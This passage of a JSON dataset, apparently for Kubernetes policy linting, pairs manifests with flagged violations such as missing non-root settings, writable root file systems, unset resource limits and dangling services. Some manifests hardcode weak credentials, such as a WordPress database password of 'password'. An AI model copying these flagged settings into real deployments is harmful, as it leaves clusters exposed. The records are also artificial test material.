    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    kompose.cmd: kompose convert -f docker-compose.prod.yaml\n    kompose.version: 1.21.0 ()\n  labels:\n    io.kompose.service: reporter\n  name: reporter\n  namespace: reporter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: reporter\n  template:\n    metadata:\n      annotations:\n        kompose.cmd: kompose convert -f docker-compose.prod.yaml\n        kompose.version: 1.21.0 ()\n      labels:\n        io.kompose.network/redis-net: 'true'\n        io.kompose.service: reporter\n    spec:\n      containers:\n      - env:\n        - name: GITHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: GITHUB_TOKEN\n              name: env\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_HOST\n              name: env\n        - name: REDIS_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PASSWORD\n              name: env\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PORT\n              name: env\n        - name: ZENHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: ZENHUB_TOKEN\n              name: env\n        image: docker.greymatter.io/internal/reporter:latest\n        imagePullPolicy: Always\n        name: reporter\n        ports:\n        - containerPort: 3000\n        resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"reporter\" does not have a read-only root file system"
  },
  {
    "id": "3286",
    "manifest_path": "data/manifests/the_stack_sample/sample_1016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    kompose.cmd: kompose convert -f docker-compose.prod.yaml\n    kompose.version: 1.21.0 ()\n  labels:\n    io.kompose.service: reporter\n  name: reporter\n  namespace: reporter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: reporter\n  template:\n    metadata:\n      annotations:\n        kompose.cmd: kompose convert -f docker-compose.prod.yaml\n        kompose.version: 1.21.0 ()\n      labels:\n        io.kompose.network/redis-net: 'true'\n        io.kompose.service: reporter\n    spec:\n      containers:\n      - env:\n        - name: GITHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: GITHUB_TOKEN\n              name: env\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_HOST\n              name: env\n        - name: REDIS_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PASSWORD\n              name: env\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PORT\n              name: env\n        - name: ZENHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: ZENHUB_TOKEN\n              name: env\n        image: docker.greymatter.io/internal/reporter:latest\n        imagePullPolicy: Always\n        name: reporter\n        ports:\n        - containerPort: 3000\n        resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"reporter\" is not set to runAsNonRoot"
  },
  {
    "id": "3287",
    "manifest_path": "data/manifests/the_stack_sample/sample_1016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    kompose.cmd: kompose convert -f docker-compose.prod.yaml\n    kompose.version: 1.21.0 ()\n  labels:\n    io.kompose.service: reporter\n  name: reporter\n  namespace: reporter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: reporter\n  template:\n    metadata:\n      annotations:\n        kompose.cmd: kompose convert -f docker-compose.prod.yaml\n        kompose.version: 1.21.0 ()\n      labels:\n        io.kompose.network/redis-net: 'true'\n        io.kompose.service: reporter\n    spec:\n      containers:\n      - env:\n        - name: GITHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: GITHUB_TOKEN\n              name: env\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_HOST\n              name: env\n        - name: REDIS_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PASSWORD\n              name: env\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PORT\n              name: env\n        - name: ZENHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: ZENHUB_TOKEN\n              name: env\n        image: docker.greymatter.io/internal/reporter:latest\n        imagePullPolicy: Always\n        name: reporter\n        ports:\n        - containerPort: 3000\n        resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"reporter\" has cpu request 0"
  },
  {
    "id": "3288",
    "manifest_path": "data/manifests/the_stack_sample/sample_1016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    kompose.cmd: kompose convert -f docker-compose.prod.yaml\n    kompose.version: 1.21.0 ()\n  labels:\n    io.kompose.service: reporter\n  name: reporter\n  namespace: reporter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: reporter\n  template:\n    metadata:\n      annotations:\n        kompose.cmd: kompose convert -f docker-compose.prod.yaml\n        kompose.version: 1.21.0 ()\n      labels:\n        io.kompose.network/redis-net: 'true'\n        io.kompose.service: reporter\n    spec:\n      containers:\n      - env:\n        - name: GITHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: GITHUB_TOKEN\n              name: env\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_HOST\n              name: env\n        - name: REDIS_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PASSWORD\n              name: env\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PORT\n              name: env\n        - name: ZENHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: ZENHUB_TOKEN\n              name: env\n        image: docker.greymatter.io/internal/reporter:latest\n        imagePullPolicy: Always\n        name: reporter\n        ports:\n        - containerPort: 3000\n        resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"reporter\" has memory limit 0"
  },
  {
    "id": "3289",
    "manifest_path": "data/manifests/the_stack_sample/sample_1017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: table-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: table-manager\n  template:\n    metadata:\n      labels:\n        name: table-manager\n    spec:\n      containers:\n      - name: table-manager\n        image: quay.io/cortexproject/cortex:v1.8.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=table-manager\n        - -server.http-listen-port=80\n        - -dynamodb.url=dynamodb://user:pass@dynamodb.default.svc.cluster.local:8000\n        - -schema-config-file=/etc/cortex/schema.yaml\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/cortex\n      volumes:\n      - name: config-volume\n        configMap:\n          name: schema-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"table-manager\" does not have a read-only root file system"
  },
  {
    "id": "3290",
    "manifest_path": "data/manifests/the_stack_sample/sample_1017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: table-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: table-manager\n  template:\n    metadata:\n      labels:\n        name: table-manager\n    spec:\n      containers:\n      - name: table-manager\n        image: quay.io/cortexproject/cortex:v1.8.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=table-manager\n        - -server.http-listen-port=80\n        - -dynamodb.url=dynamodb://user:pass@dynamodb.default.svc.cluster.local:8000\n        - -schema-config-file=/etc/cortex/schema.yaml\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/cortex\n      volumes:\n      - name: config-volume\n        configMap:\n          name: schema-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"table-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "3291",
    "manifest_path": "data/manifests/the_stack_sample/sample_1017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: table-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: table-manager\n  template:\n    metadata:\n      labels:\n        name: table-manager\n    spec:\n      containers:\n      - name: table-manager\n        image: quay.io/cortexproject/cortex:v1.8.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=table-manager\n        - -server.http-listen-port=80\n        - -dynamodb.url=dynamodb://user:pass@dynamodb.default.svc.cluster.local:8000\n        - -schema-config-file=/etc/cortex/schema.yaml\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/cortex\n      volumes:\n      - name: config-volume\n        configMap:\n          name: schema-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"table-manager\" has cpu request 0"
  },
  {
    "id": "3292",
    "manifest_path": "data/manifests/the_stack_sample/sample_1017.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: table-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: table-manager\n  template:\n    metadata:\n      labels:\n        name: table-manager\n    spec:\n      containers:\n      - name: table-manager\n        image: quay.io/cortexproject/cortex:v1.8.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=table-manager\n        - -server.http-listen-port=80\n        - -dynamodb.url=dynamodb://user:pass@dynamodb.default.svc.cluster.local:8000\n        - -schema-config-file=/etc/cortex/schema.yaml\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/cortex\n      volumes:\n      - name: config-volume\n        configMap:\n          name: schema-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"table-manager\" has memory limit 0"
  },
  {
    "id": "3293",
    "manifest_path": "data/manifests/the_stack_sample/sample_1018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress:4.8-apache\n        name: wordpress\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: mysql-lb\n        - name: WORDPRESS_DB_USER\n          value: wpuser\n        - name: WORDPRESS_DB_PASSWORD\n          value: password\n        - name: WORDPRESS_DB_NAME\n          value: wordpress\n        ports:\n        - containerPort: 80\n          name: wordpress\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3294",
    "manifest_path": "data/manifests/the_stack_sample/sample_1018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress:4.8-apache\n        name: wordpress\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: mysql-lb\n        - name: WORDPRESS_DB_USER\n          value: wpuser\n        - name: WORDPRESS_DB_PASSWORD\n          value: password\n        - name: WORDPRESS_DB_NAME\n          value: wordpress\n        ports:\n        - containerPort: 80\n          name: wordpress\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wordpress\" does not have a read-only root file system"
  },
  {
    "id": "3295",
    "manifest_path": "data/manifests/the_stack_sample/sample_1018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress:4.8-apache\n        name: wordpress\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: mysql-lb\n        - name: WORDPRESS_DB_USER\n          value: wpuser\n        - name: WORDPRESS_DB_PASSWORD\n          value: password\n        - name: WORDPRESS_DB_NAME\n          value: wordpress\n        ports:\n        - containerPort: 80\n          name: wordpress\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wordpress\" is not set to runAsNonRoot"
  },
  {
    "id": "3296",
    "manifest_path": "data/manifests/the_stack_sample/sample_1018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress:4.8-apache\n        name: wordpress\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: mysql-lb\n        - name: WORDPRESS_DB_USER\n          value: wpuser\n        - name: WORDPRESS_DB_PASSWORD\n          value: password\n        - name: WORDPRESS_DB_NAME\n          value: wordpress\n        ports:\n        - containerPort: 80\n          name: wordpress\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wordpress\" has cpu request 0"
  },
  {
    "id": "3297",
    "manifest_path": "data/manifests/the_stack_sample/sample_1018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: wordpress\n  labels:\n    app: wordpress\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: wordpress\n  template:\n    metadata:\n      labels:\n        app: wordpress\n    spec:\n      containers:\n      - image: wordpress:4.8-apache\n        name: wordpress\n        env:\n        - name: WORDPRESS_DB_HOST\n          value: mysql-lb\n        - name: WORDPRESS_DB_USER\n          value: wpuser\n        - name: WORDPRESS_DB_PASSWORD\n          value: password\n        - name: WORDPRESS_DB_NAME\n          value: wordpress\n        ports:\n        - containerPort: 80\n          name: wordpress\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wordpress\" has memory limit 0"
  },
  {
    "id": "3298",
    "manifest_path": "data/manifests/the_stack_sample/sample_1019.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: postgres-booking\n  labels:\n    app: postgres-booking\nspec:\n  ports:\n  - port: 5432\n    name: postgres-booking\n  clusterIP: None\n  selector:\n    app: postgres-booking\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:postgres-booking])"
  },
  {
    "id": "3299",
    "manifest_path": "data/manifests/the_stack_sample/sample_1021.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-cloud-sdk-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: elibixby/jenkins-cloud-sdk-slave\n    imagePullPolicy: Always\n    args:\n    - -name\n    - my-cloud-sdk-slave\n    - -labels\n    - image=google/cloud-sdk\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"jenkins-slave\" is using an invalid container image, \"elibixby/jenkins-cloud-sdk-slave\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3300",
    "manifest_path": "data/manifests/the_stack_sample/sample_1021.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-cloud-sdk-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: elibixby/jenkins-cloud-sdk-slave\n    imagePullPolicy: Always\n    args:\n    - -name\n    - my-cloud-sdk-slave\n    - -labels\n    - image=google/cloud-sdk\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jenkins-slave\" does not have a read-only root file system"
  },
  {
    "id": "3301",
    "manifest_path": "data/manifests/the_stack_sample/sample_1021.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-cloud-sdk-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: elibixby/jenkins-cloud-sdk-slave\n    imagePullPolicy: Always\n    args:\n    - -name\n    - my-cloud-sdk-slave\n    - -labels\n    - image=google/cloud-sdk\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jenkins-slave\" is not set to runAsNonRoot"
  },
  {
    "id": "3302",
    "manifest_path": "data/manifests/the_stack_sample/sample_1021.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-cloud-sdk-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: elibixby/jenkins-cloud-sdk-slave\n    imagePullPolicy: Always\n    args:\n    - -name\n    - my-cloud-sdk-slave\n    - -labels\n    - image=google/cloud-sdk\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jenkins-slave\" has cpu request 0"
  },
  {
    "id": "3303",
    "manifest_path": "data/manifests/the_stack_sample/sample_1021.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-cloud-sdk-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: elibixby/jenkins-cloud-sdk-slave\n    imagePullPolicy: Always\n    args:\n    - -name\n    - my-cloud-sdk-slave\n    - -labels\n    - image=google/cloud-sdk\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jenkins-slave\" has memory limit 0"
  },
  {
    "id": "3304",
    "manifest_path": "data/manifests/the_stack_sample/sample_1025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210712-9b395cf3fb\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"needs-rebase\" does not have a read-only root file system"
  },
  {
    "id": "3305",
    "manifest_path": "data/manifests/the_stack_sample/sample_1025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210712-9b395cf3fb\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"needs-rebase\" is not set to runAsNonRoot"
  },
  {
    "id": "3306",
    "manifest_path": "data/manifests/the_stack_sample/sample_1025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210712-9b395cf3fb\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"needs-rebase\" has cpu request 0"
  },
  {
    "id": "3307",
    "manifest_path": "data/manifests/the_stack_sample/sample_1025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210712-9b395cf3fb\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"needs-rebase\" has memory limit 0"
  },
  {
    "id": "3308",
    "manifest_path": "data/manifests/the_stack_sample/sample_1026.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: d3-service\nspec:\n  type: NodePort\n  selector:\n    app: d3\n  ports:\n  - protocol: TCP\n    port: 8080\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:d3])"
  },
  {
    "id": "3309",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "3310",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"git-clone\" does not have a read-only root file system"
  },
  {
    "id": "3311",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job\" does not have a read-only root file system"
  },
  {
    "id": "3312",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: 